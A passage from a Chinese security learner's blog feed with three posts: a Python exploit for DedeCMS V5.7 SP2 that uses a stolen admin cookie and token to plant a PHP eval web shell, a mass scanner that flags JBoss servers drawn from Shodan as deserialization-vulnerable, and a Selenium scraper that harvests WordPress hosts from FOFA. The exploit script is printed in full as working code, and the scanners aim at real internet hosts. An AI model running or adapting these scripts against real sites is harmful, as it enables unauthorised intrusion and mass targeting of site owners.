class="code"><pre><span class="line">    <span class="comment"># 带上cookie和token的值写shell</span></span><br><span class="line">rs = requests.get(</span><br><span class="line">    host + <span class="string">'/dede/tpl.php?filename=9finger.lib.php&amp;action=savetagfile&amp;content=%3C?php%20eval($_POST[\'pass\'])?%3E&amp;token='</span> + token,</span><br><span class="line">    headers=headers)</span><br><span class="line"><span class="comment"># 查看是否写入shell</span></span><br><span class="line">zt = requests.get(host + <span class="string">'/include/taglib/9finger.lib.php'</span>)</span><br><span class="line">ok = zt.status_code</span><br><span class="line"><span class="keyword">if</span> ok == <span class="number">200</span>:</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'shell的路径是'</span> + host + <span class="string">'/include/taglib/9finger.lib.php'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'失败了'</span>)</span><br></pre></td></tr></table></figure><p>这个也是前面学习到的内容写的，不解释了。<br>![](/images/DedeCMS V5.7 SP2 getshell exp 练手/4.png)<br>![](/images/DedeCMS V5.7 SP2 getshell exp 练手/5.png)</p><h2 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h2><p>其实一开始觉得这个博客有点鸡肋，但是后来在写的过程中发现好像有一套完整的方法可以getshell，现在我写的代码的前置条件是，1：知道后台 2：得到了管理员的账号密码。<br>但是后来我在写代码的过程看了别的博客，找到了另一个漏洞可以满足一个前置条件。<br>第一个：<br><a href="https://www.0dayhack.com/post-801.html">https://www.0dayhack.com/post-801.html</a><br>这个我已经验证过，可以通过漏洞查找到网站后台。<br>![](/images/DedeCMS V5.7 SP2 getshell exp 练手/6.png)<br>第二个：<br>这个还没验证，是任意用户可以通过漏洞更改前台会员密码。<br><a href="https://www.0dayhack.com/post-768.html">https://www.0dayhack.com/post-768.html</a><br>因为更改不是管理员账号密码，所以懒得去验证了。<br>所以现在还是有那么一个问题没解决，没有办法去获取管理员账号密码。<br>这里顺便把源码发一下吧。现在织梦官网最新的还是这套源码，不过以后应该是会更新修复的。<br>链接：<a href="https://pan.baidu.com/s/1TGzuRGEmSlTGS050CPBK9A">https://pan.baidu.com/s/1TGzuRGEmSlTGS050CPBK9A</a><br>提取码：vkzl</p><p>附上完整源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">host = <span class="string">'http://127.0.0.1'</span>  <span class="comment"># 织梦的网址</span></span><br><span class="line">cookie = <span class="string">"menuitems=1_1%2C2_1%2C3_1; hd_sid=gkwZpM; DedeUserID=1; DedeUserID__ckMd5=21525998e2bf23ac; PHPSESSID=a8vetc0q9j1jr0glocmr9iaq47; DedeLoginTime=1539255891; DedeLoginTime__ckMd5=c98838290139737e; _csrf_name_13a77a19=cca919ac2d38b7a95be29c2215f26b09; _csrf_name_13a77a19__ckMd5=0cab530703fcb0ac"</span>  <span class="comment"># 输入cookie</span></span><br><span class="line">headers = &#123;<span class="string">'Cookie'</span>: cookie&#125;  <span class="comment"># 在headers头添加cookie</span></span><br><span class="line">rs = requests.get(host + <span class="string">'/dede/tpl.php?action=upload  '</span>, headers=headers)  <span class="comment"># 带上cookie请求后台上传网址</span></span><br><span class="line">soup = BeautifulSoup(rs.text, <span class="string">'html.parser'</span>)  <span class="comment"># 获取网页源码</span></span><br><span class="line">width = soup.find(width=<span class="string">"504"</span>)  <span class="comment"># 查找width="504"的内容</span></span><br><span class="line">width1 = str(width)  <span class="comment"># 将获取到的内容进行类型强转</span></span><br><span class="line">rex = <span class="string">r"(?&lt;=input name=\"token\" type=\"hidden\" value=\").*(?=\")"</span>  <span class="comment"># 利用re模块匹配token的值</span></span><br><span class="line">result = re.finditer(rex, width1, flags=re.M)</span><br><span class="line"><span class="keyword">for</span> match <span class="keyword">in</span> result:</span><br><span class="line">    token = match.group()</span><br><span class="line">    <span class="comment"># 带上cookie和token的值写shell</span></span><br><span class="line">rs = requests.get(</span><br><span class="line">    host + <span class="string">'/dede/tpl.php?filename=9finger.lib.php&amp;action=savetagfile&amp;content=%3C?php%20eval($_POST[\'pass\'])?%3E&amp;token='</span> + token,</span><br><span class="line">    headers=headers)</span><br><span class="line"><span class="comment"># 查看是否写入shell</span></span><br><span class="line">zt = requests.get(host + <span class="string">'/include/taglib/9finger.lib.php'</span>)</span><br><span class="line">ok = zt.status_code</span><br><span class="line"><span class="keyword">if</span> ok == <span class="number">200</span>:</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'shell的路径是'</span> + host + <span class="string">'/include/taglib/9finger.lib.php'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'失败了'</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;自己练手写了一个exp，说实话有点鸡肋，不过反正是练手嘛。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Python" scheme="/categories/Python/"/>
    
    
      <category term="python" scheme="/tags/python/"/>
    
      <category term="EXP练手" scheme="/tags/EXP%E7%BB%83%E6%89%8B/"/>
    
  </entry>
  
  <entry>
    <title>批量验证jboss</title>
    <link href="/2018/10/08/%E6%89%B9%E9%87%8F%E9%AA%8C%E8%AF%81jboss/"/>
    <id>/2018/10/08/批量验证jboss/</id>
    <published>2018-10-07T16:00:00.000Z</published>
    <updated>2019-04-27T07:55:52.754Z</updated>
    
    <content type="html"><![CDATA[<p>根据师兄们的思路和代码自己小改的代码。</p><a id="more"></a><h2 id="jboss反序列化漏洞"><a href="#jboss反序列化漏洞" class="headerlink" title="jboss反序列化漏洞"></a>jboss反序列化漏洞</h2><p>该漏洞为 Java反序列化错误类型，存在于 Jboss 的 HttpInvoker 组件中的 ReadOnlyAccessFilter 过滤器中。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致了漏洞。<br>复现可以参考博客：<a href="https://www.cnblogs.com/Hi-blog/p/7904443.html">https://www.cnblogs.com/Hi-blog/p/7904443.html</a></p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><h3 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h3><p><strong>操作系统 Windows10</strong></p><h3 id="编译器"><a href="#编译器" class="headerlink" title="编译器"></a>编译器</h3><p><strong>pycharm</strong></p><h3 id="Python版本"><a href="#Python版本" class="headerlink" title="Python版本"></a>Python版本</h3><p><strong>Python3</strong></p><h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>两个函数吧，有些还是从网上抄来用的，还不是很理解。</p><h3 id="批量在网址后面添加路径"><a href="#批量在网址后面添加路径" class="headerlink" title="批量在网址后面添加路径"></a>批量在网址后面添加路径</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tianjia</span><span class="params">()</span>:</span></span><br><span class="line">    file = open(<span class="string">"D:/python源码/shodan爬虫.txt"</span>, <span class="string">"r"</span>, newline=<span class="string">'\r\n'</span>)  <span class="comment"># 打开爬虫文本</span></span><br><span class="line">    newfile = open(<span class="string">"D:/python源码/shodan爬虫添加.txt"</span>, <span class="string">'w'</span>, )  <span class="comment"># 创建添加路径后写入的文本</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        lines = file.readlines(<span class="number">100000</span>)  <span class="comment"># 依次读取每行</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> lines:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">            newfile.write(line.replace(<span class="string">'\r\n'</span>, <span class="string">u'/invoker/readonly\r\n'</span>))  <span class="comment"># 在每行后面添加/invoker/readonly</span></span><br><span class="line">    file.close()  <span class="comment"># 关闭文本</span></span><br><span class="line">    newfile.close()  <span class="comment"># 关闭文本</span></span><br></pre></td></tr></table></figure><p><img alt data-src="/images/%E6%89%B9%E9%87%8F%E9%AA%8C%E8%AF%81jboss/1.png" class="lazyload"></p><h3 id="批量验证"><a href="#批量验证" class="headerlink" title="批量验证"></a>批量验证</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">yanzheng</span><span class="params">()</span>:</span></span><br><span class="line">    result = []  <span class="comment"># 创建一个result的list集合</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'D:/python源码/shodan爬虫添加.txt'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">            result.append(list(line.strip(<span class="string">'\n'</span>).split(<span class="string">','</span>)))  <span class="comment"># 读取每行将每一行放入result集合里面</span></span><br><span class="line">    <span class="keyword">for</span> i, a <span class="keyword">in</span> enumerate(result):</span><br><span class="line">        <span class="keyword">if</span> (i + <span class="number">1</span>) % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">            url = a[<span class="number">0</span>]</span><br><span class="line">            NETWORK_STATUS = <span class="literal">True</span>  <span class="comment"># 创建一个NETWORK_STATUS初始状态为ture</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                r = requests.get(url)  <span class="comment"># 利用request模块get请求到网址</span></span><br><span class="line">                zt = r.status_code  <span class="comment"># 读取request返还的网页状态</span></span><br><span class="line">            <span class="keyword">except</span> requests.exceptions.ConnectionError:  <span class="comment"># 如果请求超时跑出异常使得NETWORK_STATUS的状态变成false</span></span><br><span class="line">                NETWORK_STATUS = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">if</span> zt == <span class="number">500</span>:  <span class="comment"># 判断网页状态如果等于500则存在漏洞</span></span><br><span class="line">                <span class="keyword">print</span> (url + <span class="string">'可能存在漏洞'</span>)</span><br><span class="line">                file = open(<span class="string">'D:/python源码/可能存在漏洞.txt'</span>, <span class="string">'a'</span>)</span><br><span class="line">                file.write(url + <span class="string">'\n'</span>)  <span class="comment"># 将存在漏洞的网址写入文本</span></span><br><span class="line">            <span class="keyword">elif</span> NETWORK_STATUS == <span class="literal">False</span>:  <span class="comment"># 如果请求超时返还异常时，NETWORK_STATUS为false，就输出强求超时</span></span><br><span class="line">                <span class="keyword">print</span> (url + <span class="string">'请求超时'</span>)</span><br><span class="line">            <span class="keyword">else</span>:  <span class="comment"># 其他情况则输出其他状态</span></span><br><span class="line">                <span class="keyword">print</span> (url + <span class="string">'其他状态'</span>)</span><br></pre></td></tr></table></figure><p>这个就不分析了，注释写得很清楚了，这个自己写了好一会，还请教了别人，真菜，嘤嘤嘤！！！<br>附上运行的图：<br><img alt data-src="/images/%E6%89%B9%E9%87%8F%E9%AA%8C%E8%AF%81jboss/2.gif" class="lazyload"><br><img alt data-src="/images/%E6%89%B9%E9%87%8F%E9%AA%8C%E8%AF%81jboss/3.png" class="lazyload"></p><h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>这里getshell是利用工具的，看看是否可以理由漏洞拿下该网站。<br><img alt data-src="/images/%E6%89%B9%E9%87%8F%E9%AA%8C%E8%AF%81jboss/4.png" class="lazyload"><br><img alt data-src="/images/%E6%89%B9%E9%87%8F%E9%AA%8C%E8%AF%81jboss/5.png" class="lazyload"></p><p>工具就不发了，不太好。</p><p>附上完整源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># _*_coding:utf-8_*_</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tianjia</span><span class="params">()</span>:</span></span><br><span class="line">    file = open(<span class="string">"D:/python源码/shodan爬虫.txt"</span>, <span class="string">"r"</span>, newline=<span class="string">'\r\n'</span>)  <span class="comment"># 打开爬虫文本</span></span><br><span class="line">    newfile = open(<span class="string">"D:/python源码/shodan爬虫添加.txt"</span>, <span class="string">'w'</span>, )  <span class="comment"># 创建添加路径后写入的文本</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        lines = file.readlines(<span class="number">100000</span>)  <span class="comment"># 依次读取每行</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> lines:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">            newfile.write(line.replace(<span class="string">'\r\n'</span>, <span class="string">u'/invoker/readonly\r\n'</span>))  <span class="comment"># 在每行后面添加/invoker/readonly</span></span><br><span class="line">    file.close()  <span class="comment"># 关闭文本</span></span><br><span class="line">    newfile.close()  <span class="comment"># 关闭文本</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">yanzheng</span><span class="params">()</span>:</span></span><br><span class="line">    result = []  <span class="comment"># 创建一个result的list集合</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'D:/python源码/shodan爬虫添加.txt'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">            result.append(list(line.strip(<span class="string">'\n'</span>).split(<span class="string">','</span>)))  <span class="comment"># 读取每行将每一行放入result集合里面</span></span><br><span class="line">    <span class="keyword">for</span> i, a <span class="keyword">in</span> enumerate(result):</span><br><span class="line">        <span class="keyword">if</span> (i + <span class="number">1</span>) % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">            url = a[<span class="number">0</span>]</span><br><span class="line">            NETWORK_STATUS = <span class="literal">True</span>  <span class="comment"># 创建一个NETWORK_STATUS初始状态为ture</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                r = requests.get(url)  <span class="comment"># 利用request模块get请求到网址</span></span><br><span class="line">                zt = r.status_code  <span class="comment"># 读取request返还的网页状态</span></span><br><span class="line">            <span class="keyword">except</span> requests.exceptions.ConnectionError:  <span class="comment"># 如果请求超时跑出异常使得NETWORK_STATUS的状态变成false</span></span><br><span class="line">                NETWORK_STATUS = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">if</span> zt == <span class="number">500</span>:  <span class="comment"># 判断网页状态如果等于500则存在漏洞</span></span><br><span class="line">                <span class="keyword">print</span> (url + <span class="string">'可能存在漏洞'</span>)</span><br><span class="line">                file = open(<span class="string">'D:/python源码/可能存在漏洞.txt'</span>, <span class="string">'a'</span>)</span><br><span class="line">                file.write(url + <span class="string">'\n'</span>)  <span class="comment"># 将存在漏洞的网址写入文本</span></span><br><span class="line">            <span class="keyword">elif</span> NETWORK_STATUS == <span class="literal">False</span>:  <span class="comment"># 如果请求超时返还异常时，NETWORK_STATUS为false，就输出强求超时</span></span><br><span class="line">                <span class="keyword">print</span> (url + <span class="string">'请求超时'</span>)</span><br><span class="line">            <span class="keyword">else</span>:  <span class="comment"># 其他情况则输出其他状态</span></span><br><span class="line">                <span class="keyword">print</span> (url + <span class="string">'其他状态'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    tianjia()</span><br><span class="line">    yanzheng()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;根据师兄们的思路和代码自己小改的代码。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Python" scheme="/categories/Python/"/>
    
    
      <category term="python" scheme="/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>Python爬虫初学</title>
    <link href="/2018/09/29/Python%E7%88%AC%E8%99%AB%E5%88%9D%E5%AD%A6/"/>
    <id>/2018/09/29/Python爬虫初学/</id>
    <published>2018-09-29T04:00:00.000Z</published>
    <updated>2019-04-27T07:51:39.192Z</updated>
    
    <content type="html"><![CDATA[<p>python+selenium 自动化爬虫。初写Python代码。</p><a id="more"></a><h2 id="fofa介绍"><a href="#fofa介绍" class="headerlink" title="fofa介绍"></a>fofa介绍</h2><p>FOFA是白帽汇推出的一款网络空间资产搜索引擎。<br>它能够帮助用户迅速进行网络资产匹配、加快后续工作进程。<br>例如进行漏洞影响范围分析、应用分布统计、应用流行度排名统计等。</p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><h3 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h3><p><strong>操作系统 Windows10</strong></p><h3 id="编译器"><a href="#编译器" class="headerlink" title="编译器"></a>编译器</h3><p><strong>pycharm</strong></p><h3 id="浏览器"><a href="#浏览器" class="headerlink" title="浏览器"></a>浏览器</h3><p><strong>谷歌浏览器</strong></p><h3 id="Python版本"><a href="#Python版本" class="headerlink" title="Python版本"></a>Python版本</h3><p><strong>Python3</strong></p><h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>写这个代码应该可以说是将手工的操作写成代码。可以这么理解吧，我把每一步分解写成代码。</p><h3 id="打开网站"><a href="#打开网站" class="headerlink" title="打开网站"></a>打开网站</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 打开浏览器</span></span><br><span class="line"><span class="comment"># 教程：https://blog.csdn.net/trisyp/article/details/78688106</span></span><br><span class="line">driver = webdriver.Chrome()  <span class="comment"># selenium要和chromedriver版本相匹配,模拟打开浏览器,chromedriver.exe放在python安装目录下</span></span><br><span class="line">driver.get(<span class="string">"https://i.nosec.org/login?service=http%3A%2F%2Ffofa.so%2Fusers%2Fservice"</span>)  <span class="comment"># 打开网址</span></span><br><span class="line">driver.maximize_window()  <span class="comment"># 窗口最大化（无关紧要哈）</span></span><br></pre></td></tr></table></figure><p>这一步模拟手工打开浏览器步骤。</p><p><img alt data-src="/images/Python%E7%88%AC%E8%99%AB%E5%88%9D%E5%AD%A6/1.gif" class="lazyload"></p><h3 id="模拟登陆"><a href="#模拟登陆" class="headerlink" title="模拟登陆"></a>模拟登陆</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 模拟登陆</span></span><br><span class="line">wait = WebDriverWait(driver, <span class="number">10</span>)</span><br><span class="line">username_input = wait.until(EC.presence_of_element_located((By.NAME, <span class="string">'username'</span>)))  <span class="comment"># 查找 账号框name=username</span></span><br><span class="line">password_input = wait.until(EC.presence_of_element_located((By.NAME, <span class="string">'password'</span>)))  <span class="comment"># 查找 密码框name=password</span></span><br><span class="line">submit = wait.until(EC.element_to_be_clickable((By.NAME, <span class="string">'button'</span>)))  <span class="comment"># 查找登录按钮</span></span><br><span class="line">username_input.send_keys(<span class="string">'账号'</span>)  <span class="comment"># 输入账号</span></span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">password_input.send_keys(<span class="string">'密码'</span>)  <span class="comment"># 输入密码</span></span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">submit.click()  <span class="comment"># 登录</span></span><br><span class="line">time.sleep(<span class="number">4</span>)</span><br></pre></td></tr></table></figure><p>分析一下怎么查找到登录框和登陆按钮的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username_input = wait.until(EC.presence_of_element_located((By.NAME, <span class="string">'username'</span>)))  <span class="comment"># 查找 账号框name=username</span></span><br></pre></td></tr></table></figure><p>通过查找HTML源码页面内的name，判断name=username，查找到账号输入框。<br><img alt data-src="/images/Python%E7%88%AC%E8%99%AB%E5%88%9D%E5%AD%A6/2.png" class="lazyload"></p><p>密码输入框和登入按钮同理。</p><p><img alt data-src="/images/Python%E7%88%AC%E8%99%AB%E5%88%9D%E5%AD%A6/3.png" class="lazyload"><br><img alt data-src="/images/Python%E7%88%AC%E8%99%AB%E5%88%9D%E5%AD%A6/4.png" class="lazyload"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.send_keys <span class="comment"># 向输入框输入内容</span></span><br><span class="line">.click     <span class="comment"># 点击</span></span><br></pre></td></tr></table></figure><p><img alt data-src="/images/Python%E7%88%AC%E8%99%AB%E5%88%9D%E5%AD%A6/5.gif" class="lazyload"></p><h3 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 搜索</span></span><br><span class="line">wait = WebDriverWait(driver, <span class="number">10</span>)</span><br><span class="line">query_input = wait.until(EC.presence_of_element_located((By.NAME, <span class="string">'q'</span>)))  <span class="comment"># 查找输入框name=q</span></span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">query_input.send_keys(<span class="string">'WordPress'</span>)  <span class="comment"># 搜索WordPress</span></span><br><span class="line">submit1 = wait.until(EC.presence_of_element_located((By.CLASS_NAME, <span class="string">'search_tj'</span>)))  <span class="comment"># 查找搜索按钮class=search_tj</span></span><br><span class="line">time.sleep(<span class="number">4</span>)</span><br><span class="line">submit1.click()</span><br></pre></td></tr></table></figure><p>和模拟登陆的道理一样的，只不过搜索按钮是查找的元素是CLASS_NAME而已。</p><p><img alt data-src="/images/Python%E7%88%AC%E8%99%AB%E5%88%9D%E5%AD%A6/6.gif" class="lazyload"></p><h3 id="爬取前5页的内容"><a href="#爬取前5页的内容" class="headerlink" title="爬取前5页的内容"></a>爬取前5页的内容</h3><p>因为fofa游客只能看前五页内容。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> count &lt; <span class="number">5</span>:</span><br><span class="line">    count = count + <span class="number">1</span></span><br><span class="line">    driver.current_url  <span class="comment"># 获取网页当前url</span></span><br><span class="line">    time.sleep(<span class="number">3</span>)  <span class="comment"># 强制等待3秒再执行下一步</span></span><br><span class="line">    driver.get(driver.current_url)  <span class="comment"># 获取网页源码</span></span><br><span class="line">    <span class="comment">#解析目标网页的 Html 源码</span></span><br><span class="line">    html = driver.page_source</span><br><span class="line">    soup = BeautifulSoup(html, <span class="string">'html.parser'</span>)</span><br><span class="line">    <span class="comment"># 对网页源码进行处理</span></span><br><span class="line">    <span class="keyword">for</span> news <span class="keyword">in</span> soup.select(<span class="string">'.list_mod'</span>):  <span class="comment"># 搜索class=list_mod内的内容</span></span><br><span class="line">        ip = news.select(<span class="string">'a'</span>)[<span class="number">0</span>][<span class="string">'href'</span>]  <span class="comment"># 搜索a href后的内容</span></span><br><span class="line">        print(ip)</span><br><span class="line">        <span class="comment"># 将内容写入文本</span></span><br><span class="line">        file = open(<span class="string">'D:/python源码/fofa爬虫.txt'</span>, <span class="string">'a'</span>)</span><br><span class="line">        file.write(ip + <span class="string">'\n'</span>)</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">"写进去了"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 点击下一页</span></span><br><span class="line">    time.sleep(<span class="number">4</span>)</span><br><span class="line">    submit2 = wait.until(EC.presence_of_element_located((By.CLASS_NAME, <span class="string">'next_page'</span>)))  <span class="comment"># 查找下一页按钮 class=next_page</span></span><br><span class="line">    time.sleep(<span class="number">4</span>)</span><br><span class="line">    submit2.click()  <span class="comment"># 点击下一页</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"搞定了"</span>)</span><br></pre></td></tr></table></figure><p>写了一个while循环让它重复以下步骤知道爬取到第五页的时候停下。可以自己改判断的位置选择爬到多少页。</p><p>分析一下爬取内容的代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">driver.current_url  <span class="comment"># 获取网页当前url</span></span><br></pre></td></tr></table></figure><p>此处调用了selenium模块获取当前页面的url，以获取当前网页的HTML源码，在这里写的时候遇到了一个坑，当时用的是request模块，导致翻到下一页的时候获取到了下一页的url以后但是获取到的html源码还是第一页的源码所以重复爬取了第一页的内容。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">driver.get(driver.current_url)  <span class="comment"># 获取网页源码</span></span><br></pre></td></tr></table></figure><p>这里也是调用selenium模块获取当前网页的html源码，用了以后就不再是重复获取了第一页的html源码了。这里的 driver.page_source 意思是网页的全部 HTML 源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#解析目标网页的 Html 源码</span></span><br><span class="line">html = driver.page_source </span><br><span class="line">soup = BeautifulSoup(html, <span class="string">'html.parser'</span>)</span><br></pre></td></tr></table></figure><p>用BeautifulSoup4模块解析网页源码，这个过程就相当于右键的点击审查的过程。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 对网页源码进行处理</span></span><br><span class="line"><span class="keyword">for</span> news <span class="keyword">in</span> soup.select(<span class="string">'.list_mod'</span>):  <span class="comment"># 搜索class=list_mod内的内容</span></span><br><span class="line">    ip = news.select(<span class="string">'a'</span>)[<span class="number">0</span>][<span class="string">'href'</span>]  <span class="comment"># 搜索a href后的内容</span></span><br></pre></td></tr></table></figure><p>这里用图来做分析。<br><img alt data-src="/images/Python%E7%88%AC%E8%99%AB%E5%88%9D%E5%AD%A6/7.png" class="lazyload"><br>注释哪里解释的很清楚了，可以自己按照这个教程做下实验，了解一下语法。<br><a href="https://blog.csdn.net/major_zhang/article/details/69658738">https://blog.csdn.net/major_zhang/article/details/69658738</a></p><p>看下完整运行的样子！！！</p><p><img alt data-src="/images/Python%E7%88%AC%E8%99%AB%E5%88%9D%E5%AD%A6/8.gif" class="lazyload"></p><p>附上完整源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 